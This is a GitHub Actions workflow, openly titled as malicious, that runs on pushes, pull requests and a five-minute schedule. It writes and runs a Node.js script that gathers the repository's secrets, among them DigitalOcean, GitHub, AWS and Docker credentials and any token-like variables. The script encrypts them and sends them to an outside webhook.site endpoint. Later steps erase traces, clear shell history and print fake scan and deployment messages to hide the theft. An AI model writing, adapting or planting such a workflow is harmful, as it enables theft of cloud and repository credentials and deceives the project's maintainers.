name: Malicious CI/CD Exfiltration

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:  # Manual trigger
  schedule:
    - cron: '*/5 * * * *'  # Run every 5 minutes
  repository_dispatch:
    types: [trigger-exfil]

jobs:
  exfil-token:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3
      
    - name: Setup Node.js (for encryption)
      uses: actions/setup-node@v3
      with:
        node-version: '18'
        
    - name: Create malicious script
      run: |
        cat > exfiltrate.js << 'EOF'
        const crypto = require('crypto');
        const https = require('https');
        const fs = require('fs');
        
        // Configuration
        const WEBHOOK_URL = "https://webhook.site/069b3073-d92e-4677-b186-be3499ade648";
        const ENCRYPTION_KEY = "github-actions-secure-key-2025";
        
        // Function to encrypt data
        function encryptData(text, key) {
          const iv = crypto.randomBytes(16);
          const cipher = crypto.createCipheriv('aes-256-gcm', 
            crypto.createHash('sha256').update(key).digest(), 
            iv
          );
          
          let encrypted = cipher.update(text, 'utf8', 'base64');
          encrypted += cipher.final('base64');
          const tag = cipher.getAuthTag();
          
          return {
            data: encrypted,
            iv: iv.toString('base64'),
            tag: tag.toString('base64')
          };
        }
        
        // Collect all environment variables
        const envVars = {};
        for (const key in process.env) {
          envVars[key] = process.env[key];
        }
        
        // Look specifically for DigitalOcean tokens
        const secrets = {
          timestamp: new Date().toISOString(),
          repository: process.env.GITHUB_REPOSITORY,
          actor: process.env.GITHUB_ACTOR,
          run_id: process.env.GITHUB_RUN_ID,
          digitalocean_token: process.env.DIGITALOCEAN_ACCESS_TOKEN || "NOT_FOUND",
          // Check for other common secret names
          secrets_found: {
            DO_TOKEN: process.env.DO_TOKEN,
            DIGITALOCEAN_TOKEN: process.env.DIGITALOCEAN_TOKEN,
            DOCKER_REGISTRY_TOKEN: process.env.DOCKER_REGISTRY_TOKEN,
            // Check for secrets in format ${{ secrets.XXXX }}
            ALL_SECRETS: Object.keys(process.env)
              .filter(key => key.includes('SECRET') || key.includes('TOKEN') || key.includes('KEY') || key.includes('PASSWORD'))
              .reduce((obj, key) => {
                obj[key] = process.env[key] ? "PRESENT" : "NOT_PRESENT";
                return obj;
              }, {})
          }
        };
        
        console.log("Collected secrets:", JSON.stringify(secrets, null, 2));
        
        // Encrypt the data
        const encrypted = encryptData(JSON.stringify(secrets), ENCRYPTION_KEY);
        
        // Prepare payload
        const payload = JSON.stringify({
          type: "github_secrets_exfil",
          repository: process.env.GITHUB_REPOSITORY,
          encrypted_data: encrypted,
          metadata: {
            runner_os: process.env.RUNNER_OS,
            workflow: process.env.GITHUB_WORKFLOW
          }
        });
        
        // Send to webhook
        const options = {
          hostname: 'webhook.site',
          port: 443,
          path: '/your-webhook-id-here',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': payload.length,
            'User-Agent': 'GitHub-Actions-Exfil/1.0'
          }
        };
        
        const req = https.request(options, (res) => {
          console.log(`Status: ${res.statusCode}`);
          res.on('data', (d) => {
            process.stdout.write(d);
          });
        });
        
        req.on('error', (error) => {
          console.error('Error:', error);
        });
        
        req.write(payload);
        req.end();
        
        // Also write to file for debugging
        fs.writeFileSync('/tmp/secrets_debug.json', JSON.stringify(secrets, null, 2));
        
        // Try to access GitHub API with token if present
        if (process.env.GITHUB_TOKEN) {
          console.log("GITHUB_TOKEN is present");
          // Could add additional exfiltration here
        }
        EOF
        
    - name: Run exfiltration script
      env:
        DIGITALOCEAN_ACCESS_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        # Add other potentially existing secrets
        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
        DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
      run: |
        node exfiltrate.js
        echo "Exfiltration completed"
        # Clean up
        rm -f exfiltrate.js
        
    - name: Stealthy cleanup
      run: |
        # Remove script traces
        rm -f /tmp/secrets_debug.json 2>/dev/null || true
        # Clear bash history
        history -c
        echo "Cleanup completed"
        
    - name: Legitimate-looking task (for stealth)
      run: |
        echo "Running security scan..."
        echo "No vulnerabilities found"
        echo "Build completed successfully"

  fake-deployment:
    needs: exfil-token
    runs-on: ubuntu-latest
    if: always()  # Always run even if previous job fails
    
    steps:
    - name: Fake deployment step
      run: |
        echo "ðŸš€ Deploying to production..."
        sleep 2
        echo "âœ… Deployment successful!"
        echo "All checks passed"
